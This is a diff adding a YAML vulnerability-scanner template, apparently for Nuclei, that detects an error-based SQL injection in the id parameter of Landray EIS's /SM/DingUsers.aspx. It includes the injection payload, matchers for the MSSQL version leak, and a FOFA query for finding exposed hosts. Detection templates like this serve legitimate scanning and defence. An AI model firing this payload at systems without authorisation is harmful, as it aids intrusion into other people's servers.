@@ -1,0 +1,27 @@
+id: landray-zhihuixietong-dingusers-sqli
+
+info:
+  name: 蓝凌 EIS DingUsers.aspx SQL 注入
+  author: AVIC123
+  severity: high
+  description: |
+    蓝凌 EIS 智慧协同平台 /SM/DingUsers.aspx 的 id 参数可报错注入，回显 Microsoft SQL Server 版本信息。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="EIS智慧协同平台"
+  tags: landray,eis,sqli
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/SM/DingUsers.aspx?id=1%20and%201=@@version--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+      - type: status
+        status:
+          - 500
